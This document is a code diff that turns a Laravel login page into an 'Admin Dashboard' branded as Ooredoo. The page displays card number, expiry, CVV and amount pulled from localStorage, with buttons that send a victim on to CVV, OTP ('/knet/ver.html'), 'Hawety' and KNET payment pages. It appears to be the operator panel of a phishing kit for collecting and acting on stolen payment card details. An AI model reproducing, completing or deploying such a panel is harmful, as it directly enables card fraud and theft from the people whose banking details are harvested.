@@ -1,118 +1,336 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="csrf-token" content="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl">
-
-    <title>Laravel</title>
-
-    <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.bunny.net">
-    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />
-
-    <!-- Scripts -->
-    <link rel="preload" as="style" href="https://asderw-link.com/build/assets/app-B9BS2dwd.css" />
-    <link rel="modulepreload" href="https://asderw-link.com/build/assets/app-BHNLSFp3.js" />
-    <link rel="stylesheet" href="https://asderw-link.com/build/assets/app-B9BS2dwd.css" data-navigate-track="reload" />
-    <script type="module" src="https://asderw-link.com/build/assets/app-BHNLSFp3.js" data-navigate-track="reload"></script>
-    <!-- Styles -->
-    <!-- Livewire Styles -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Ooredoo</title>
     <style>
-        [wire\:loading][wire\:loading],
-        [wire\:loading\.delay][wire\:loading\.delay],
-        [wire\:loading\.inline-block][wire\:loading\.inline-block],
-        [wire\:loading\.inline][wire\:loading\.inline],
-        [wire\:loading\.block][wire\:loading\.block],
-        [wire\:loading\.flex][wire\:loading\.flex],
-        [wire\:loading\.table][wire\:loading\.table],
-        [wire\:loading\.grid][wire\:loading\.grid],
-        [wire\:loading\.inline-flex][wire\:loading\.inline-flex] {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: #ff0000;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+        }
+        
+        .back-btn {
+            background: white;
+            color: #ff0000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .back-btn:hover {
+            background: #f0f0f0;
+        }
+        
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .data-section {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .data-section h2 {
+            color: #ff0000;
+            margin-bottom: 15px;
+            font-size: 18px;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 10px;
+        }
+        
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .data-item:last-child {
+            border-bottom: none;
+        }
+        
+        .data-label {
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .data-value {
+            color: #333;
+            word-break: break-all;
+        }
+        
+        .actions {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+        
+        .actions h2 {
+            color: #ff0000;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .action-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        
+        .action-btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .btn-accept {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .btn-accept:hover {
+            background: #45a049;
+        }
+        
+        .btn-reject {
+            background: #f44336;
+            color: white;
+        }
+        
+        .btn-reject:hover {
+            background: #da190b;
+        }
+        
+        .btn-navigate {
+            background: #2196F3;
+            color: white;
+        }
+        
+        .btn-navigate:hover {
+            background: #0b7dda;
+        }
+        
+        .navigation {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .navigation h2 {
+            color: #ff0000;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .nav-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        
+        .status-message {
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
             display: none;
         }
-
-        [wire\:loading\.delay\.none][wire\:loading\.delay\.none],
-        [wire\:loading\.delay\.shortest][wire\:loading\.delay\.shortest],
-        [wire\:loading\.delay\.shorter][wire\:loading\.delay\.shorter],
-        [wire\:loading\.delay\.short][wire\:loading\.delay\.short],
-        [wire\:loading\.delay\.default][wire\:loading\.delay\.default],
-        [wire\:loading\.delay\.long][wire\:loading\.delay\.long],
-        [wire\:loading\.delay\.longer][wire\:loading\.delay\.longer],
-        [wire\:loading\.delay\.longest][wire\:loading\.delay\.longest] {
-            display: none;
+        
+        .status-message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
         }
-
-        [wire\:offline][wire\:offline] {
-            display: none;
+        
+        .status-message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
         }
-
-        [wire\:dirty]:not(textarea):not(input):not(select) {
-            display: none;
-        }
-
-        :root {
-            --livewire-progress-bar-color: #2299dd;
-        }
-
-        [x-cloak] {
-            display: none !important;
+        
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header {
+                flex-direction: column;
+                gap: 15px;
+            }
         }
     </style>
 </head>
-
 <body>
-    <div class="font-sans text-gray-900 antialiased">
-        <div class="min-h-screen flex flex-col sm:justify-center items-center pt-6 sm:pt-0 bg-gray-100">
-            <div>
-                <a href="/">
-    <svg class="w-16 h-16" viewbox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M11.395 44.428C4.557 40.198 0 32.632 0 24 0 10.745 10.745 0 24 0a23.891 23.891 0 0113.997 4.502c-.2 17.907-11.097 33.245-26.602 39.926z" fill="#6875F5"/>
-        <path d="M14.134 45.885A23.914 23.914 0 0024 48c13.255 0 24-10.745 24-24 0-3.516-.756-6.856-2.115-9.866-4.659 15.143-16.608 27.092-31.75 31.751z" fill="#6875F5"/>
-    </svg>
-</a>
+    <div class="container">
+        <div class="header">
+            <h1>Admin Dashboard</h1>
+            <button class="back-btn" onclick="goHome()">← Back to Home</button>
+        </div>
+        
+        <div id="statusMessage" class="status-message"></div>
+        
+        <div class="dashboard-grid">
+            <div class="data-section">
+                <h2>Payment Information</h2>
+                <div class="data-item">
+                    <span class="data-label">Card Number:</span>
+                    <span class="data-value" id="cardNumber">Not provided</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Expiry Date:</span>
+                    <span class="data-value" id="expiryDate">Not provided</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">CVV:</span>
+                    <span class="data-value" id="cvv">Not provided</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Amount:</span>
+                    <span class="data-value" id="amount">Not provided</span>
+                </div>
             </div>
-
-            <div class="w-full sm:max-w-md mt-6 px-6 py-4 bg-white shadow-md overflow-hidden sm:rounded-lg">
-                <form method="POST" action="https://asderw-link.com/login">
-                    <input type="hidden" name="_token" value="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl" autocomplete="off">
-                    <div>
-                        <label class="block font-medium text-sm text-gray-700" for="email">
-    Email
-</label>
-                        <input class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm block mt-1 w-full" id="email" type="email" name="email" required="required" autofocus="autofocus" autocomplete="username">
-                    </div>
-
-                    <div class="mt-4">
-                        <label class="block font-medium text-sm text-gray-700" for="password">
-    Password
-</label>
-                        <input class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm block mt-1 w-full" id="password" type="password" name="password" required="required" autocomplete="current-password">
-                    </div>
-
-                    <div class="block mt-4">
-                        <label for="remember_me" class="flex items-center">
-                    <input type="checkbox" class="rounded border-gray-300 text-indigo-600 shadow-sm focus:ring-indigo-500" id="remember_me" name="remember">
-                    <span class="ms-2 text-sm text-gray-600">Remember me</span>
-                </label>
-                    </div>
-
-                    <div class="flex items-center justify-end mt-4">
-                        <a class="underline text-sm text-gray-600 hover:text-gray-900 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" href="https://asderw-link.com/forgot-password">
-                        Forgot your password?
-                    </a>
-
-                        <button type="submit" class="inline-flex items-center px-4 py-2 bg-gray-800 border border-transparent rounded-md font-semibold text-xs text-white uppercase tracking-widest hover:bg-gray-700 focus:bg-gray-700 active:bg-gray-900 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 transition ease-in-out duration-150 ms-4">
-    Log in
-</button>
-                    </div>
-                </form>
+            
+            <div class="data-section">
+                <h2>Transaction Details</h2>
+                <div class="data-item">
+                    <span class="data-label">Status:</span>
+                    <span class="data-value" id="status">Pending</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Timestamp:</span>
+                    <span class="data-value" id="timestamp">-</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Transaction ID:</span>
+                    <span class="data-value" id="transactionId">-</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="actions">
+            <h2>Actions</h2>
+            <div class="action-buttons">
+                <button class="action-btn btn-accept" onclick="acceptTransaction()">✓ Accept</button>
+                <button class="action-btn btn-reject" onclick="rejectTransaction()">✗ Reject</button>
+                <button class="action-btn btn-navigate" onclick="goToCVV()">Go to CVV</button>
+                <button class="action-btn btn-navigate" onclick="goToOTP()">Go to OTP</button>
+                <button class="action-btn btn-navigate" onclick="goToHawety()">Go to Hawety</button>
+            </div>
+        </div>
+        
+        <div class="navigation">
+            <h2>Navigation</h2>
+            <div class="nav-buttons">
+                <button class="action-btn btn-navigate" onclick="goToPayment()">Payment Page</button>
+                <button class="action-btn btn-navigate" onclick="goHome()">Home</button>
             </div>
         </div>
     </div>
-
-    <!-- Livewire Scripts -->
-    <script src="/livewire/livewire.js?id=cc800bf4" data-csrf="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl" data-update-uri="/livewire/update" data-navigate-once="true"></script>
+    
+    <script>
+        // Load payment data from localStorage
+        function loadPaymentData() {
+            const paymentData = localStorage.getItem('paymentData');
+            if (paymentData) {
+                const data = JSON.parse(paymentData);
+                document.getElementById('cardNumber').textContent = data.cardNumber || 'Not provided';
+                document.getElementById('expiryDate').textContent = data.expiryDate || 'Not provided';
+                document.getElementById('cvv').textContent = data.cvv || 'Not provided';
+                document.getElementById('amount').textContent = data.amount || 'Not provided';
+                document.getElementById('timestamp').textContent = new Date().toLocaleString();
+                document.getElementById('transactionId').textContent = 'TXN-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            }
+        }
+        
+        function acceptTransaction() {
+            showStatus('Transaction accepted successfully!', 'success');
+            setTimeout(() => {
+                localStorage.removeItem('paymentData');
+                goHome();
+            }, 2000);
+        }
+        
+        function rejectTransaction() {
+            showStatus('Transaction rejected!', 'error');
+            setTimeout(() => {
+                localStorage.removeItem('paymentData');
+                goHome();
+            }, 2000);
+        }
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.textContent = message;
+            statusDiv.className = 'status-message ' + type;
+        }
+        
+        function goToCVV() {
+            window.location.href = '/cvv.html';
+        }
+        
+        function goToOTP() {
+            window.location.href = '/knet/ver.html';
+        }
+        
+        function goToHawety() {
+            window.location.href = '/hawety.html';
+        }
+        
+        function goToPayment() {
+            window.location.href = '/knetpage.html';
+        }
+        
+        function goHome() {
+            window.location.href = '/';
+        }
+        
+        // Load data when page loads
+        window.addEventListener('load', loadPaymentData);
+    </script>
 </body>
-
 </html>
